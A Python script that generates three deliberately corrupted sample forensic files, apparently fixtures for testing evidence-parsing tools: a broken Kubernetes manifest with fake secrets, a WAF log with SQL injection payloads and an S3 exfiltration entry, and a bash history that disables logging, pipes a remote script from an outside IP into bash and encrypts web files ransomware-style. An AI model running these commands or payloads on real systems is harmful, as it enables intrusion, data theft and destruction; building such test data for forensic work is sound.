import os

os.makedirs("sample_evidence", exist_ok=True)

# 1. Broken JSON Manifest (Invalid syntax, dangling bracket, corrupted sectors)
corrupted_json = (
    b'{\n'
    b'  "apiVersion": "apps/v1",\n'
    b'  "kind": "Deployment",\n'
    b'  "metadata": {"name": "payment-gateway", "namespace": "prod"},\n'
    b'  "spec": {\n'
    b'    "replicas": 3,\n'
    b'    "template": {\n'
    b'      "spec": {\n'
    b'        "containers": [{\n'
    b'          "name": "gateway",\n'
    b'          "image": "internal.registry.io/payment/api:v4.1.2",\n'
    b'          "env": [\n'
    b'            {"name": "STRIPE_SECRET_KEY", "value": "sk_live_51M0xDemoSecretKey98231"},\n'
    b'            {"name": "DATABASE_URL", "value": "postgres://pgadmin:TempPass2026@10.0.\x00\x00\xff\xfe'
)
with open("sample_evidence/corrupted_k8s_manifest.json", "wb") as f:
    f.write(corrupted_json)

# 2. Damaged WAF / SQLi Incident Log (Truncated payload & corrupted timestamps)
corrupted_log = (
    b'2026-09-25T17:42:01.112Z [WAF-BLOCK] src_ip=198.51.100.74 rule_id=942100 uri="/api/v1/users?id=1\'%20UNION%20SELECT%20username,password_hash%20FROM%20users--"\n'
    b'2026-09-25T17:42:15.890Z [WAF-BYPASS] src_ip=198.51.100.74 http_status=200 uri="/api/v1/auth/login" payload="admin\'#"\n'
    b'\x00\x00\x00[BAD_SECTOR_JUMP_BLOCK]\x00\x00\x00\n'
    b'status=200 user=admin action="export_all_tokens" target_s3="s3://exfil-drop-bucket-2026/data.tar.gz"\n'
    b'2026-09-25T17:45:00Z [SYSTEM] auditd daemon stopped unexpectedly'
)
with open("sample_evidence/truncated_attack_chain.log", "wb") as f:
    f.write(corrupted_log)

# 3. Cut-off Bash History / C2 Dropper (Ransomware staging trace)
corrupted_bash = (
    b'export HISTFILE=/dev/null\n'
    b'uname -a\n'
    b'curl -s http://185.220.101.5/payload.sh | bash\n'
    b'find /var/www -type f -exec openssl enc -aes-256-cbc -salt -in {} -out {}.enc -k "R@ns0m_2026_K3y" \\;\n'
    b'# FATAL WRITE ERROR: SECTOR WRITE FAILED AT LBA 4882812\n'
    b'echo "Your files are enc'
)
with open("sample_evidence/ransomware_drop_bash_history.raw", "wb") as f:
    f.write(corrupted_bash)

print("Generated 3 corrupted forensic test files inside sample_evidence/ folder!")